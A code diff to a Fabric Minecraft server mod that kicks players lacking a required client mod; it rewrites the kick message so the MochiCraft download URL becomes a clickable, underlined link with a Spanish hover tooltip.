@@ -5,7 +5,12 @@ import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
 import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
 import net.minecraft.server.network.ServerPlayNetworkHandler;
 import net.minecraft.server.network.ServerPlayerEntity;
+import net.minecraft.text.ClickEvent;
+import net.minecraft.text.HoverEvent;
+import net.minecraft.text.MutableText;
+import net.minecraft.text.Style;
 import net.minecraft.text.Text;
+import net.minecraft.util.Formatting;
 
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -17,23 +22,6 @@ public class ModKick implements ModInitializer {
 
     // 100 ticks = 5 segundos
     private static final int TICKS_ANTES_DE_KICK = 100;
-
-    private static final String MOD_MENSAJE =
-        "\n" +
-        "§c                                             Connection Lost\n" +
-        "\n" +
-        "§e                            You need Fabric Auth + the Biome Journey pack.\n" +
-        "§e           Download both .jar files from the website and install them in .minecraft/mods:\n" +
-        "\n" +
-        "§a                                             How to install\n" +
-        "§a                         1. Install Fabric Loader + Fabric API (fabricmc.net)\n" +
-        "§a                             for Minecraft 1.21.11\n" +
-        "§a           2. Download fabric-auth.jar and the Mochi Mod Pack from https://www.mochicraft.net/\n" +
-        "§a3. Place BOTH jars in .minecraft/mods along with Fabric API — do not confuse fabric-auth with Fabric API.\n" +
-        "§a                 4. Restart the launcher, select the fabric profile and join again.\n" +
-        "\n" +
-        "§a                                   Required key (mod id): fabric-auth\n" +
-        "§a                                            Mod: MochiCraft";
 
     private static class Congelado {
         final double x, y, z;
@@ -83,8 +71,45 @@ public class ModKick implements ModInitializer {
 
             for (ServerPlayNetworkHandler h : aKickear) {
                 congelados.remove(h.getPlayer().getUuid());
-                h.disconnect(Text.literal(MOD_MENSAJE));
+                // Llamamos al método que crea el mensaje con el enlace clickeable
+                h.disconnect(crearMensajeKick());
             }
         });
+    }
+
+    private static Text crearMensajeKick() {
+        // Usamos MutableText para poder ir agregando partes (texto normal + enlaces)
+        MutableText mensaje = Text.literal("");
+
+        // Agregamos el texto normal (sin espacios extras a los lados para que Minecraft lo centre solo)
+        mensaje.append(Text.literal("\n§cConnection Lost\n\n"));
+        mensaje.append(Text.literal("§eYou need Fabric Auth + the Biome Journey pack.\n"));
+        mensaje.append(Text.literal("§eDownload both .jar files from the website and install them in .minecraft/mods:\n\n"));
+        mensaje.append(Text.literal("§aHow to install\n"));
+        mensaje.append(Text.literal("§a1. Install Fabric Loader + Fabric API (fabricmc.net)\n"));
+        mensaje.append(Text.literal("§a   for Minecraft 1.21.11\n"));
+        
+        // Llegamos a la parte del enlace
+        mensaje.append(Text.literal("§a2. Download fabric-auth.jar and the Mochi Mod Pack from "));
+
+        // Creamos el texto del enlace con su evento de clic
+        Text enlace = Text.literal("https://www.mochicraft.net/")
+                .setStyle(Style.EMPTY
+                        .withColor(Formatting.AQUA) // Color celeste para que parezca enlace
+                        .withUnderline(true)        // Subrayado
+                        .withClickEvent(new ClickEvent(ClickEvent.Action.OPEN_URL, "https://www.mochicraft.net/")) // Acción al hacer clic
+                        .withHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, Text.literal("§7¡Haz clic para abrir la página!"))) // Texto al pasar el ratón
+                );
+
+        // Agregamos el enlace al mensaje
+        mensaje.append(enlace);
+
+        // Continuamos con el resto del texto
+        mensaje.append(Text.literal("\n§a3. Place BOTH jars in .minecraft/mods along with Fabric API — do not confuse fabric-auth with Fabric API.\n"));
+        mensaje.append(Text.literal("§a4. Restart the launcher, select the fabric profile and join again\n\n"));
+        mensaje.append(Text.literal("§aRequired key (mod id): fabric-auth\n"));
+        mensaje.append(Text.literal("§aMod: MochiCraft"));
+
+        return mensaje;
     }
 }
